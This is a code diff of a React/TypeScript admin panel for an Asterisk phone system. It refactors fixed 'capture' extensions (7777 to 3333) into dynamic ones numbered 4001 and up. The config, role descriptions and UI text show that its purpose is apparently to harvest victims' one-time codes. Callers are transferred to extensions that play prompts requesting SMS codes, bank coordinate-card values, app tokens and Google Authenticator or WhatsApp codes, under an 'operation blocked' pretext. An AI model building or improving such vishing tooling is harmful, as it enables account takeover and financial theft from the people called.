@@ -47,24 +47,9 @@ interface AudioLibraryTabProps {
   onAssignToPress1: (audioId: string) => void;
   onAssignToOtp: (audioId: string) => void;
   onAssignToAgentTransfer?: (audioId: string) => void;
-  onAssignTo7777?: (audioId: string) => void;
-  onAssignTo6666?: (audioId: string) => void;
-  onAssignTo5555?: (audioId: string) => void;
-  onAssignTo4444?: (audioId: string) => void;
-  onAssignTo3333?: (audioId: string) => void;
   activeAssignments?: ActiveAudioAssignments;
   onAssignRole?: (role: AudioRole, asteriskPath: string, isManualSave?: boolean) => void;
   lockedConfigs?: {
-    welcome_6666?: boolean;
-    welcome_7777?: boolean;
-    welcome_5555?: boolean;
-    welcome_4444?: boolean;
-    welcome_3333?: boolean;
-    lock_7777?: boolean;
-    lock_6666?: boolean;
-    lock_5555?: boolean;
-    lock_4444?: boolean;
-    lock_3333?: boolean;
     ivr_entity?: boolean;
     [key: string]: boolean | undefined;
   };
@@ -87,83 +72,7 @@ export interface OtpExtensionInfo {
   ringColor: string;
 }
 
-export const OTP_EXTENSIONS_CONFIG: OtpExtensionInfo[] = [
-  {
-    id: '7777',
-    extension: '7777',
-    shortExt: '777',
-    name: 'Captura Primaria / Tarjetas & OTP',
-    purpose: 'Canal principal para transferir al cliente a solicitud de código numérico, SMS o coordenadas.',
-    badge: 'Primaria (7777 / 777)',
-    colorName: 'purple',
-    bgGradient: 'from-purple-950/40 via-slate-900 to-slate-950',
-    borderColor: 'border-purple-500/40',
-    textColor: 'text-purple-300',
-    badgeColor: 'bg-purple-600 text-white',
-    accentBg: 'bg-purple-500/20 text-purple-300 border-purple-500/30',
-    ringColor: 'focus:border-purple-400',
-  },
-  {
-    id: '6666',
-    extension: '6666',
-    shortExt: '666',
-    name: 'Captura Secundaria / Token App Móvil',
-    purpose: 'Canal optimizado para Token Móvil de aplicaciones y autenticación de usuario.',
-    badge: 'App / Token (6666 / 666)',
-    colorName: 'cyan',
-    bgGradient: 'from-cyan-950/40 via-slate-900 to-slate-950',
-    borderColor: 'border-cyan-500/40',
-    textColor: 'text-cyan-300',
-    badgeColor: 'bg-cyan-600 text-black',
-    accentBg: 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30',
-    ringColor: 'focus:border-cyan-400',
-  },
-  {
-    id: '5555',
-    extension: '5555',
-    shortExt: '555',
-    name: 'Captura Alternativa / Redes & Cuentas',
-    purpose: 'Canal dedicado para verificación de WhatsApp, Google Authenticator, correo o servicios web.',
-    badge: 'Alternativa (5555 / 555)',
-    colorName: 'amber',
-    bgGradient: 'from-amber-950/40 via-slate-900 to-slate-950',
-    borderColor: 'border-amber-500/40',
-    textColor: 'text-amber-300',
-    badgeColor: 'bg-amber-600 text-black',
-    accentBg: 'bg-amber-500/20 text-amber-300 border-amber-500/30',
-    ringColor: 'focus:border-amber-400',
-  },
-  {
-    id: '4444',
-    extension: '4444',
-    shortExt: '444',
-    name: 'Captura Validación Móvil / SMS',
-    purpose: 'Canal con guión enfocado en mensajes SMS de operadoras y códigos numéricos estándar.',
-    badge: 'SMS Móvil (4444 / 444)',
-    colorName: 'emerald',
-    bgGradient: 'from-emerald-950/40 via-slate-900 to-slate-950',
-    borderColor: 'border-emerald-500/40',
-    textColor: 'text-emerald-300',
-    badgeColor: 'bg-emerald-600 text-black',
-    accentBg: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30',
-    ringColor: 'focus:border-emerald-400',
-  },
-  {
-    id: '3333',
-    extension: '3333',
-    shortExt: '333',
-    name: 'Captura Respaldo / Emergencia',
-    purpose: 'Línea de contingencia rápida con locuciones de seguridad y reintento inmediato.',
-    badge: 'Respaldo (3333 / 333)',
-    colorName: 'pink',
-    bgGradient: 'from-pink-950/40 via-slate-900 to-slate-950',
-    borderColor: 'border-pink-500/40',
-    textColor: 'text-pink-300',
-    badgeColor: 'bg-pink-600 text-white',
-    accentBg: 'bg-pink-500/20 text-pink-300 border-pink-500/30',
-    ringColor: 'focus:border-pink-400',
-  },
-];
+export const OTP_EXTENSIONS_CONFIG: OtpExtensionInfo[] = [];
 
 export interface ExtensionAudioSlotMeta {
   slot: 'welcome' | 'wait' | 'success' | 'failure';
@@ -237,61 +146,6 @@ interface RoleConfig {
 }
 
 const SYSTEM_ROLES: RoleConfig[] = [
-  {
-    role: 'welcome_7777',
-    title: 'Bienvenida Extensión 7777 (Captura en Vivo)',
-    badge: 'Extensión 7777',
-    badgeColor: 'bg-purple-500/20 text-purple-300 border-purple-500/30',
-    category: 'otp',
-    icon: Headphones,
-    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 7777 para capturar el código OTP.',
-    astDbKey: 'ivr_vars 7777_intro',
-    fallbackDefault: 'custom/solicitar_codigo_otp',
-  },
-  {
-    role: 'welcome_6666',
-    title: 'Bienvenida Extensión 6666 (Captura en Vivo)',
-    badge: 'Extensión 6666',
-    badgeColor: 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30',
-    category: 'otp',
-    icon: Headphones,
-    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 6666 para capturar el código OTP con locución independiente.',
-    astDbKey: 'ivr_vars 6666_intro',
-    fallbackDefault: 'custom/bienvenida_6666',
-  },
-  {
-    role: 'welcome_5555',
-    title: 'Bienvenida Extensión 5555 (Captura en Vivo)',
-    badge: 'Extensión 5555',
-    badgeColor: 'bg-amber-500/20 text-amber-300 border-amber-500/30',
-    category: 'otp',
-    icon: Headphones,
-    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 5555 para capturar el código OTP con locución independiente.',
-    astDbKey: 'ivr_vars 5555_intro',
-    fallbackDefault: 'custom/solicitar_codigo_otp',
-  },
-  {
-    role: 'welcome_4444',
-    title: 'Bienvenida Extensión 4444 (Captura en Vivo)',
-    badge: 'Extensión 4444',
-    badgeColor: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30',
-    category: 'otp',
-    icon: Headphones,
-    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 4444 para capturar el código OTP con locución independiente.',
-    astDbKey: 'ivr_vars 4444_intro',
-    fallbackDefault: 'custom/solicitar_codigo_otp',
-  },
-  {
-    role: 'welcome_3333',
-    title: 'Bienvenida Extensión 3333 (Captura en Vivo)',
-    badge: 'Extensión 3333',
-    badgeColor: 'bg-pink-500/20 text-pink-300 border-pink-500/30',
-    category: 'otp',
-    icon: Headphones,
-    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 3333 para capturar el código OTP con locución independiente.',
-    astDbKey: 'ivr_vars 3333_intro',
-    fallbackDefault: 'custom/solicitar_codigo_otp',
-  },
   {
     role: 'press1_welcome',
     title: 'Bienvenida IVR Press 1 (Llamada Inicial)',
@@ -391,11 +245,6 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
   onAssignToPress1,
   onAssignToOtp,
   onAssignToAgentTransfer,
-  onAssignTo7777,
-  onAssignTo6666,
-  onAssignTo5555,
-  onAssignTo4444,
-  onAssignTo3333,
   activeAssignments: propActiveAssignments,
   onAssignRole,
   lockedConfigs,
@@ -416,23 +265,14 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
     }
   }, [currentUser?.tenantId]);
 
-  // Manual locks state for individual audio configurations (7777, 6666, 5555, 4444, 3333)
+  // Manual locks state for individual audio configurations (4001+ / ivr_entity)
   const [localLocks, setLocalLocks] = useState<Record<string, boolean>>(() => {
     try {
       const s = localStorage.getItem('ast20_audio_locks_ui');
       if (s) return JSON.parse(s);
     } catch (_) {}
     return {
-      welcome_7777: false,
-      welcome_6666: false,
-      welcome_5555: false,
-      welcome_4444: false,
-      welcome_3333: false,
-      lock_7777: false,
-      lock_6666: false,
-      lock_5555: false,
-      lock_4444: false,
-      lock_3333: false,
+      ivr_entity: false,
     };
   });
 
@@ -445,38 +285,12 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
     );
   };
 
-  const isLocked6666 = isExtLocked('6666');
-  const isLocked7777 = isExtLocked('7777');
-  const isLocked5555 = isExtLocked('5555');
-  const isLocked4444 = isExtLocked('4444');
-  const isLocked3333 = isExtLocked('3333');
-
   // Active assignments state
   const [activeAssignments, setActiveAssignments] = useState<ActiveAudioAssignments>(
     propActiveAssignments || {
       press1_welcome: 'custom/bienvenida_corporativa',
       agent_transfer: 'custom/conectar_asesor',
       press1_invalid: 'custom/opcion_invalida',
-      welcome_7777: 'custom/solicitar_codigo_otp',
-      wait_7777: 'custom/un_momento_validando_informacion',
-      success_7777: 'custom/operacion_bloqueada_exito',
-      failure_7777: 'custom/token_invalido_reintente',
-      welcome_6666: 'custom/solicitar_codigo_otp',
-      wait_6666: 'custom/un_momento_validando_informacion',
-      success_6666: 'custom/operacion_bloqueada_exito',
-      failure_6666: 'custom/token_invalido_reintente',
-      welcome_5555: 'custom/solicitar_codigo_otp',
-      wait_5555: 'custom/un_momento_validando_informacion',
-      success_5555: 'custom/operacion_bloqueada_exito',
-      failure_5555: 'custom/token_invalido_reintente',
-      welcome_4444: 'custom/solicitar_codigo_otp',
-      wait_4444: 'custom/un_momento_validando_informacion',
-      success_4444: 'custom/operacion_bloqueada_exito',
-      failure_4444: 'custom/token_invalido_reintente',
-      welcome_3333: 'custom/solicitar_codigo_otp',
-      wait_3333: 'custom/un_momento_validando_informacion',
-      success_3333: 'custom/operacion_bloqueada_exito',
-      failure_3333: 'custom/token_invalido_reintente',
       otp_welcome: 'custom/solicitar_codigo_otp',
       otp_wait: 'custom/un_momento_validando_informacion',
       otp_success: 'custom/operacion_bloqueada_exito',
@@ -496,13 +310,10 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
       if (data.success && data.assignments) {
         setActiveAssignments((prev) => {
           const next = { ...data.assignments };
-          // Preserve locked extension configurations against auto-sync
-          ['7777', '6666', '5555', '4444', '3333'].forEach((ext) => {
-            if (isExtLocked(ext)) {
-              if (prev[`welcome_${ext}`]) next[`welcome_${ext}`] = prev[`welcome_${ext}`];
-              if (prev[`wait_${ext}`]) next[`wait_${ext}`] = prev[`wait_${ext}`];
-              if (prev[`success_${ext}`]) next[`success_${ext}`] = prev[`success_${ext}`];
-              if (prev[`failure_${ext}`]) next[`failure_${ext}`] = prev[`failure_${ext}`];
+          Object.keys(prev).forEach((k) => {
+            const match = k.match(/^(?:welcome|wait|success|failure)_(\d{4,})$/);
+            if (match && isExtLocked(match[1]) && prev[k]) {
+              next[k] = prev[k];
             }
           });
           return next;
@@ -630,13 +441,10 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
     if (propActiveAssignments) {
       setActiveAssignments((prev) => {
         const next = { ...propActiveAssignments };
-        // Preserve locked configurations
-        ['7777', '6666', '5555', '4444', '3333'].forEach((ext) => {
-          if (isExtLocked(ext)) {
-            if (prev[`welcome_${ext}`]) next[`welcome_${ext}`] = prev[`welcome_${ext}`];
-            if (prev[`wait_${ext}`]) next[`wait_${ext}`] = prev[`wait_${ext}`];
-            if (prev[`success_${ext}`]) next[`success_${ext}`] = prev[`success_${ext}`];
-            if (prev[`failure_${ext}`]) next[`failure_${ext}`] = prev[`failure_${ext}`];
+        Object.keys(prev).forEach((k) => {
+          const match = k.match(/^(?:welcome|wait|success|failure)_(\d{4,})$/);
+          if (match && isExtLocked(match[1]) && prev[k]) {
+            next[k] = prev[k];
           }
         });
         return next;
@@ -759,11 +567,6 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
     setTimeout(() => setFeedbackMsg(null), 4000);
   };
 
-  const handleSaveConfig7777 = () => handleSaveConfigExtension('7777');
-  const handleUnlock7777 = () => handleUnlockExtension('7777');
-  const handleSaveConfig6666 = () => handleSaveConfigExtension('6666');
-  const handleUnlock6666 = () => handleUnlockExtension('6666');
-
   // Handler to deactivate / unassign an audio from a role
   const handleDeactivateRole = async (role: AudioRole) => {
     setIsSyncingRole((prev) => ({ ...prev, [role]: true }));
@@ -789,30 +592,32 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
     }
   };
 
-  // Handler to permanently save and lock 7777, 6666, 5555, 4444 and 3333 configuration
+  // Handler to permanently save and lock dynamic OTP 4001+ extensions configuration
   const [isSavingOtpExtensions, setIsSavingOtpExtensions] = useState(false);
   const [otpExtensionsSaved, setOtpExtensionsSaved] = useState(false);
 
   const handleSaveOtpExtensions = async () => {
+    const extList = dynamicOtpExtensions.map((d) => d.extension);
+    if (extList.length === 0) {
+      setFeedbackMsg({
+        text: 'Crea primero al menos una extensión OTP (4001 en adelante) para guardar y blindar sus audios.',
+        type: 'info',
+      });
+      setTimeout(() => setFeedbackMsg(null), 4500);
+      return;
+    }
+
     setIsSavingOtpExtensions(true);
     try {
+      const lockedRoles: Record<string, boolean> = {};
       const payload: any = {
         isLocked: true,
-        lockedRoles: {
-          lock_7777: true,
-          lock_6666: true,
-          lock_5555: true,
-          lock_4444: true,
-          lock_3333: true,
-          welcome_7777: true,
-          welcome_6666: true,
-          welcome_5555: true,
-          welcome_4444: true,
-          welcome_3333: true,
-        },
+        lockedRoles,
       };
 
-      ['7777', '6666', '5555', '4444', '3333'].forEach((ext) => {
+      extList.forEach((ext) => {
+        lockedRoles[`lock_${ext}`] = true;
+        lockedRoles[`welcome_${ext}`] = true;
         payload[`welcome_${ext}`] = activeAssignments[`welcome_${ext}`] || 'custom/solicitar_codigo_otp';
         payload[`wait_${ext}`] = activeAssignments[`wait_${ext}`] || 'custom/un_momento_validando_informacion';
         payload[`success_${ext}`] = activeAssignments[`success_${ext}`] || 'custom/operacion_bloqueada_exito';
@@ -828,24 +633,12 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
       if (data.success) {
         setOtpExtensionsSaved(true);
         setLocalLocks((prev) => {
-          const next = {
-            ...prev,
-            lock_7777: true,
-            lock_6666: true,
-            lock_5555: true,
-            lock_4444: true,
-            lock_3333: true,
-            welcome_7777: true,
-            welcome_6666: true,
-            welcome_5555: true,
-            welcome_4444: true,
-            welcome_3333: true,
-          };
+          const next = { ...prev, ...lockedRoles };
           try { localStorage.setItem('ast20_audio_locks_ui', JSON.stringify(next)); } catch (_) {}
           return next;
         });
 
-        ['7777', '6666', '5555', '4444', '3333'].forEach((ext) => {
+        extList.forEach((ext) => {
           onToggleLock?.(`welcome_${ext}`, true);
           onToggleLock?.(`lock_${ext}`, true);
         });
@@ -855,7 +648,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
         }
 
         setFeedbackMsg({
-          text: '✓ Todas las extensiones OTP (7777, 6666, 5555, 4444, 3333) guardadas y blindadas en AstDB sin cruce de audios.',
+          text: `✓ Todas las extensiones OTP (${extList.join(', ')}) guardadas y blindadas en AstDB sin cruce de audios.`,
           type: 'success',
         });
         setTimeout(() => {
@@ -873,14 +666,14 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
     }
   };
 
-  // Featured Extensions View State (Dynamic 4001+ / 7777 / 6666 / 5555 / 4444 / 3333)
+  // Featured Extensions View State (Dynamic 4001+)
   const [featuredExtTab, setFeaturedExtTab] = useState<string>('all');
 
   // Upload modal state
   const [isDragging, setIsDragging] = useState(false);
   const [isUploadModalOpen, setIsUploadModalOpen] = useState(false);
   const [newAudioName, setNewAudioName] = useState('');
-  const [newAudioCategory, setNewAudioCategory] = useState<AudioPrompt['category']>('welcome_7777');
+  const [newAudioCategory, setNewAudioCategory] = useState<AudioPrompt['category']>('otp_welcome');
   const [stagedFileDataUrl, setStagedFileDataUrl] = useState<string | null>(null);
   const [stagedFileName, setStagedFileName] = useState('');
   const [stagedFileSize, setStagedFileSize] = useState('');
@@ -999,14 +792,6 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
 
         await handleAssignRoleDirect(slotKey as any, cleanPath, true);
 
-        if (slot === 'welcome') {
-          if (ext === '7777') onAssignTo7777?.(newAudioItem.id);
-          else if (ext === '6666') onAssignTo6666?.(newAudioItem.id);
-          else if (ext === '5555') onAssignTo5555?.(newAudioItem.id);
-          else if (ext === '4444') onAssignTo4444?.(newAudioItem.id);
-          else if (ext === '3333') onAssignTo3333?.(newAudioItem.id);
-        }
-
         setFeedbackMsg({
           text: `✓ Audio para Extensión ${ext} (${slotLabels[slot]}) cargado y activo con éxito en Asterisk: ${cleanPath}`,
           type: 'success',
@@ -1040,11 +825,6 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
   };
 
   const categoryLabels: Record<string, { label: string; color: string }> = {
-    welcome_7777: { label: 'Bienvenida Extensión 7777', color: 'text-purple-400 bg-purple-500/10 border-purple-500/20 font-bold' },
-    welcome_6666: { label: 'Bienvenida Extensión 6666', color: 'text-cyan-400 bg-cyan-500/10 border-cyan-500/20 font-bold' },
-    welcome_5555: { label: 'Bienvenida Extensión 5555', color: 'text-amber-400 bg-amber-500/10 border-amber-500/20 font-bold' },
-    welcome_4444: { label: 'Bienvenida Extensión 4444', color: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20 font-bold' },
-    welcome_3333: { label: 'Bienvenida Extensión 3333', color: 'text-pink-400 bg-pink-500/10 border-pink-500/20 font-bold' },
     press1_welcome: { label: 'IVR Bienvenida Press 1', color: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20' },
     press1_invalid: { label: 'IVR Opción Inválida', color: 'text-rose-400 bg-rose-500/10 border-rose-500/20' },
     agent_transfer: { label: 'Transferencia Asesor (Opción 1)', color: 'text-amber-400 bg-amber-500/10 border-amber-500/20' },
@@ -1522,7 +1302,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                 </span>
               </div>
               <p className="text-xs text-slate-400 mt-1 max-w-3xl">
-                Cada extensión (<strong className="text-purple-300">7777 / 777</strong>, <strong className="text-cyan-300">6666 / 666</strong>, <strong className="text-amber-300">5555 / 555</strong>, <strong className="text-emerald-300">4444 / 444</strong> y <strong className="text-pink-300">3333 / 333</strong>) está completamente aislada en Asterisk AstDB con sus 4 audios individuales: <span className="text-slate-200">1. Solicitud OTP</span>, <span className="text-slate-200">2. Espera de Validación</span>, <span className="text-slate-200">3. Aprobado</span> y <span className="text-slate-200">4. Inválido</span>.
+                Cada extensión de captura OTP (<strong className="text-emerald-300 font-mono">4001 en adelante</strong>) está completamente aislada en Asterisk AstDB con sus 4 audios individuales: <span className="text-slate-200">1. Solicitud OTP</span>, <span className="text-slate-200">2. Espera de Validación</span>, <span className="text-slate-200">3. Aprobado</span> y <span className="text-slate-200">4. Inválido</span>.
               </p>
             </div>
           </div>
@@ -1552,15 +1332,15 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
               onClick={handleSaveOtpExtensions}
               disabled={isSavingOtpExtensions}
               className={`px-4 py-2 rounded-xl text-xs font-bold transition-all flex items-center gap-2 shadow-lg active:scale-95 cursor-pointer ${
-                otpExtensionsSaved || (isExtLocked('7777') && isExtLocked('6666') && isExtLocked('5555') && isExtLocked('4444') && isExtLocked('3333'))
+                otpExtensionsSaved || (dynamicOtpExtensions.length > 0 && dynamicOtpExtensions.every((d) => isExtLocked(d.extension)))
                   ? 'bg-emerald-500 hover:bg-emerald-400 text-black shadow-emerald-500/20 ring-2 ring-emerald-400'
                   : 'bg-gradient-to-r from-purple-600 via-indigo-600 to-cyan-600 hover:from-purple-500 hover:to-cyan-500 text-white shadow-indigo-600/30'
               }`}
-              title="Guardar y blindar todas las extensiones OTP contra sobreescritura automática"
+              title="Guardar y blindar todas las extensiones OTP 4001+ contra sobreescritura automática"
             >
               {isSavingOtpExtensions ? (
                 <RefreshCw className="w-4 h-4 animate-spin" />
-              ) : otpExtensionsSaved || (isExtLocked('7777') && isExtLocked('6666')) ? (
+              ) : otpExtensionsSaved || (dynamicOtpExtensions.length > 0 && dynamicOtpExtensions.every((d) => isExtLocked(d.extension))) ? (
                 <ShieldCheck className="w-4 h-4" />
               ) : (
                 <Save className="w-4 h-4" />
@@ -1589,10 +1369,10 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
               }`}
             >
               <Layers className="w-3.5 h-3.5" />
-              <span>Ver Todas ({dynamicOtpExtensions.length > 0 ? dynamicOtpExtensions.length : OTP_EXTENSIONS_CONFIG.length})</span>
+              <span>Ver Todas ({dynamicOtpExtensions.length})</span>
             </button>
 
-            {(dynamicOtpExtensions.length > 0 ? dynamicOtpExtensions.map((d, index) => {
+            {dynamicOtpExtensions.map((d, index) => {
               const colors: Array<Omit<OtpExtensionInfo, 'id' | 'extension' | 'shortExt' | 'name' | 'purpose' | 'badge'>> = [
                 {
                   colorName: 'purple',
@@ -1641,7 +1421,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                 },
               ];
               const st = colors[index % colors.length];
-              return {
+              const extInfo: OtpExtensionInfo = {
                 id: d.id || d.extension,
                 extension: d.extension,
                 shortExt: d.extension.length > 3 ? d.extension.slice(-3) : d.extension,
@@ -1649,9 +1429,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                 purpose: d.purpose || `Canal interactivo para la extensión ${d.extension}`,
                 badge: d.badge || `Ext. ${d.extension}`,
                 ...st,
-                isDynamic: true,
-              } as OtpExtensionInfo & { isDynamic?: boolean };
-            }) : OTP_EXTENSIONS_CONFIG).map((extInfo) => {
+              };
               const active = featuredExtTab === extInfo.extension;
               const locked = isExtLocked(extInfo.extension);
               return (
@@ -1665,7 +1443,6 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                   }`}
                 >
                   <span>Ext. {extInfo.extension}</span>
-                  <span className="text-[10px] opacity-80 font-normal">({extInfo.shortExt})</span>
                   {locked && <Lock className="w-3 h-3 text-amber-400" />}
                 </button>
               );
@@ -1674,12 +1451,34 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
 
           <div className="text-[11px] text-slate-400 hidden xl:flex items-center gap-1.5 px-2">
             <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
-            <span>Marcación Asterisk aislada por variable de canal</span>
+            <span>Marcación Asterisk aislada por variable de canal (_4XXX)</span>
           </div>
         </div>
 
-        {/* PANELES DE EXTENSIONES OTP (Dinamicas >= 4001 / Estándar) */}
-        {(dynamicOtpExtensions.length > 0 ? dynamicOtpExtensions.map((d, index) => {
+        {/* Estado vacío si aún no hay extensiones OTP >= 4001 */}
+        {dynamicOtpExtensions.length === 0 && (
+          <div className="p-6 rounded-2xl bg-slate-900/70 border border-dashed border-emerald-500/30 text-center space-y-3">
+            <p className="text-xs text-slate-300">
+              No hay extensiones de captura OTP creadas todavía. Las funciones de captura OTP operan exclusivamente desde la extensión <strong className="text-emerald-300 font-mono">4001 en adelante</strong>.
+            </p>
+            <button
+              type="button"
+              onClick={() => {
+                setNewExtNum('4001');
+                setNewExtBadge('Ext. 4001');
+                setNewExtName('Captura Código Dinámico 4001');
+                setIsCreateModalOpen(true);
+              }}
+              className="px-4 py-2 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold text-xs inline-flex items-center gap-1.5 cursor-pointer"
+            >
+              <Plus className="w-4 h-4" />
+              <span>Crear Primera Extensión OTP (4001)</span>
+            </button>
+          </div>
+        )}
+
+        {/* PANELES DE EXTENSIONES OTP (Dinámicas >= 4001) */}
+        {dynamicOtpExtensions.map((d, index) => {
           const colors: Array<Omit<OtpExtensionInfo, 'id' | 'extension' | 'shortExt' | 'name' | 'purpose' | 'badge'>> = [
             {
               colorName: 'purple',
@@ -1738,7 +1537,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
             ...st,
             isDynamic: true,
           } as OtpExtensionInfo & { isDynamic?: boolean };
-        }) : OTP_EXTENSIONS_CONFIG).filter(
+        }).filter(
           (extInfo) => featuredExtTab === 'all' || featuredExtTab === extInfo.extension
         ).map((extInfo) => {
           const locked = isExtLocked(extInfo.extension);
@@ -2039,13 +1838,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
             return (
               <div
                 key={roleConf.role}
-                className={`p-4 rounded-xl border transition-all flex flex-col justify-between space-y-3 ${
-                  roleConf.role === 'welcome_7777'
-                    ? 'bg-gradient-to-br from-purple-950/30 to-slate-950 border-purple-500/40 shadow-md'
-                    : roleConf.role === 'welcome_6666'
-                    ? 'bg-gradient-to-br from-cyan-950/30 to-slate-950 border-cyan-500/40 shadow-md'
-                    : 'bg-slate-950/70 border-slate-800 hover:border-slate-700'
-                }`}
+                className="p-4 rounded-xl border transition-all flex flex-col justify-between space-y-3 bg-slate-950/70 border-slate-800 hover:border-slate-700"
               >
                 <div>
                   <div className="flex items-start justify-between gap-2 mb-2">
@@ -2408,45 +2201,32 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
               <div className="pt-2 border-t border-slate-800 space-y-1.5">
                 <span className="text-[10px] text-slate-400 font-medium block">Asignar en 1 clic como:</span>
                 <div className="flex items-center gap-1.5 flex-wrap">
-                  <button
-                    onClick={() => {
-                      if (activeAssignments.welcome_7777 === audio.asteriskPath) {
-                        handleDeactivateRole('welcome_7777');
-                      } else {
-                        handleAssignRoleDirect('welcome_7777', audio.asteriskPath);
-                      }
-                    }}
-                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
-                      activeAssignments.welcome_7777 === audio.asteriskPath
-                        ? 'bg-purple-500 text-white font-bold shadow-sm shadow-purple-500/20 hover:bg-purple-600'
-                        : 'bg-purple-500/10 text-purple-300 border border-purple-500/20 hover:bg-purple-500/20'
-                    }`}
-                    title={activeAssignments.welcome_7777 === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como bienvenida de la extensión 7777"}
-                  >
-                    <Sparkles className="w-3 h-3" />
-                    <span>Ext 7777</span>
-                    {activeAssignments.welcome_7777 === audio.asteriskPath && <span>✓ (Activo)</span>}
-                  </button>
-
-                  <button
-                    onClick={() => {
-                      if (activeAssignments.welcome_6666 === audio.asteriskPath) {
-                        handleDeactivateRole('welcome_6666');
-                      } else {
-                        handleAssignRoleDirect('welcome_6666', audio.asteriskPath);
-                      }
-                    }}
-                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
-                      activeAssignments.welcome_6666 === audio.asteriskPath
-                        ? 'bg-cyan-500 text-black font-bold shadow-sm shadow-cyan-500/20 hover:bg-cyan-600'
-                        : 'bg-cyan-500/10 text-cyan-300 border border-cyan-500/20 hover:bg-cyan-500/20'
-                    }`}
-                    title={activeAssignments.welcome_6666 === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como bienvenida de la extensión 6666"}
-                  >
-                    <Sparkles className="w-3 h-3 text-cyan-300" />
-                    <span>Ext 6666</span>
-                    {activeAssignments.welcome_6666 === audio.asteriskPath && <span>✓ (Activo)</span>}
-                  </button>
+                  {dynamicOtpExtensions.map((d) => {
+                    const roleKey = `welcome_${d.extension}`;
+                    const isAssignedHere = activeAssignments[roleKey] === audio.asteriskPath;
+                    return (
+                      <button
+                        key={d.extension}
+                        onClick={() => {
+                          if (isAssignedHere) {
+                            handleDeactivateRole(roleKey);
+                          } else {
+                            handleAssignRoleDirect(roleKey, audio.asteriskPath);
+                          }
+                        }}
+                        className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
+                          isAssignedHere
+                            ? 'bg-purple-500 text-white font-bold shadow-sm shadow-purple-500/20 hover:bg-purple-600'
+                            : 'bg-purple-500/10 text-purple-300 border border-purple-500/20 hover:bg-purple-500/20'
+                        }`}
+                        title={isAssignedHere ? `Activo actualmente en Ext ${d.extension}. Clic para desactivar` : `Asignar como bienvenida de la extensión ${d.extension}`}
+                      >
+                        <Sparkles className="w-3 h-3" />
+                        <span>Ext {d.extension}</span>
+                        {isAssignedHere && <span>✓ (Activo)</span>}
+                      </button>
+                    );
+                  })}
 
                   <button
                     onClick={() => {
@@ -2663,11 +2443,11 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                   onChange={(e) => setNewAudioCategory(e.target.value as AudioPrompt['category'])}
                   className="w-full px-3 py-2 rounded-md bg-slate-950 border border-slate-800 text-white focus:border-emerald-500 focus:outline-none text-xs"
                 >
-                  <option value="welcome_7777">Bienvenida Extensión 7777 (Captura en Vivo)</option>
-                  <option value="welcome_6666">Bienvenida Extensión 6666 (Captura en Vivo)</option>
-                  <option value="welcome_5555">Bienvenida Extensión 5555 (Captura en Vivo)</option>
-                  <option value="welcome_4444">Bienvenida Extensión 4444 (Captura en Vivo)</option>
-                  <option value="welcome_3333">Bienvenida Extensión 3333 (Captura en Vivo)</option>
+                  {dynamicOtpExtensions.map((d) => (
+                    <option key={d.extension} value={`welcome_${d.extension}`}>
+                      Bienvenida Extensión {d.extension} (Captura OTP en Vivo)
+                    </option>
+                  ))}
                   <option value="press1_welcome">Bienvenida IVR Press 1 (Al contestar llamada)</option>
                   <option value="agent_transfer">Transferencia a Asesor ("Un momento por favor...")</option>
                   <option value="press1_invalid">Opción Inválida en Menú Press 1</option>
